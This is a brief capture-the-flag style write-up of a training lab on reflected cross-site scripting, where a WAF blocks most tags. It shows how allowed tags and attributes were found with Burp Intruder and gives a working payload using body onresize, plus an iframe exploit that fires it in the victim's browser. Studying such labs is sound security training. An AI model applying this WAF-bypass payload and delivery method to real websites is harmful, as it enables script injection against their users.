# Lab: Reflected XSS into HTML context with most tags and attributes blocked

## Goal
 - To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

## Enumeration
 - Tags and attributes blocked
 - find allowed tags using intruder in burp suit
Result: <body> allowed
 - find allowed attributes using intruder in burp suit
Result: found useful attribute that allowed, onresize
## Testting
 - The payload was rendered as HTML.
 - will use iframe tag on exploit server to resize iframe and trigger print()

## Exploitation
 Final payload:
```
<body%20onresize="print()">
```
And because we use exploit server here is iframe which will open automatically on victim pc
```
<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
onload=this.style.width='100px>
```
## Root cause
 - not all tags/attributes were restricted
## Remediation 
 - properly validate input